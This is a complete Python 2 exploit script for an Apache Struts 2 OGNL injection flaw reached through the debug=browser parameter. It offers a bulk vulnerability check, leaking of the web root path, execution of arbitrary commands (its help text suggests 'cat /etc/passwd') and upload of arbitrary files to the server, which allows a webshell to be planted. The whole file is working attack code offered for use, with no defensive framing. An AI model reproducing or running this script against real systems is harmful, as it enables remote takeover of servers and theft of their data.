#!/usr/bin/env python
#-*- coding: utf-8 -*-     
import re
import requests
import argparse
import random
import string
from urllib import quote

def parse_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u","--url",help='test target url,for example:http://www.abc.com/index.action')
    parser.add_argument("-c","--cmd",help='the cmd to execute,for examble:"cat /etc/passwd"')
    parser.add_argument('--upload',default=False,action='store_true',help='upload file,PLEASE set --remote_file and --local_file')
    parser.add_argument('--remote_file',help='upload file to remote')
    parser.add_argument('--local_file',help='local file to upload')
    parser.add_argument("-f","--file",help='load target url from file')

    args = parser.parse_args()
    if args.url == None :
        print parser.print_help()
        print "You must set the target by -u!"
        exit()
    return args

def verify(url):
    url_req = url+'?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=netstat -an'
    result = None
    try:
        r= requests.get(url_req,timeout=5)
        if r.status_code == 200 and "0.0.0.0" in r.text:
            result = (True,"Vulnerable!")
            r_pwd = getpwd(url)
            if r_pwd[0] == True:
                result = (True,r_pwd[1].strip())
        else:
            result = (False,'fail')
    except Exception ,e:
        result = (False,str(e))

    return result

def getpwd(url):
    result = None
    url_req = url + '?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS),%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23req.getRealPath(%23c),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23parameters.content[0]),%23hh.getWriter().println(%23b),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=%2f&reqobj=111&content='
    try:
        r= requests.get(url_req,timeout=5)
        if r.status_code == 200 :
            result = (True,r.text)
        else:
            result = (False,'fail!')
    except Exception ,e:
        result = (False,str(e))

    return result

def execute(url,cmd):
    cmd = quote(cmd)
    result = None
    url_req = url + '?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command%5B0%5D%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5B51020%5D%2c%23c.read%28%23d%29%2c%23kxlzx%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%29%2c%23kxlzx.close&command='+cmd
    try:
        r= requests.get(url_req,timeout=5)
        if r.status_code == 200 :
            result = (True,r.text.strip())
        else:
            result = (False,'fail!')
    except Exception ,e:
        result = (False,str(e))

    return result

def upload_file(url,remote_filename,local_filepath):
    file_content = ''
    with open(local_filepath,'r') as f:
        file_content = quote(f.read())
    url_req=url + '?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS),%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23parameters.reqobj[1],%23fos%3dnew java.io.FileOutputStream(%23b),%23fos.write(%23parameters.content[0].getBytes()),%23fos.close(),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23parameters.reqobj[2]),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj='+ remote_filename +'&reqobj=OK&content='+file_content
    try:
        r= requests.get(url_req,timeout=5)
        if r.status_code == 200 and r.text.strip() == 'OK':
            result = (True,'success!')
        else:
            result = (False,'fail!')
    except Exception ,e:
        result = (False,str(e))

    return result

def main():
    args=parse_argument()
       
    if args.file:
        f=open(args.file,'r')
        for i in f.readlines():
            url = i.strip()
            result = verify(url)
            print result[0],':',url
    elif args.upload:
        if args.remote_file == None or args.local_file == None:
            print 'You must set the --remote_file and --local_file'
            exit()
        result = upload_file(args.url,args.remote_file,args.local_file)
        if result[0]:
            print 'Success:%s' %result[1]
        else:
            print 'Fail!'
    else:
        if args.cmd:
            result = execute(args.url,args.cmd)
            if result[0]==True:
                print result[1]
            else:
                print 'False'
        else:
            result = verify(args.url)
            print result[0],':',result[1]
    
if __name__=="__main__":
    main()
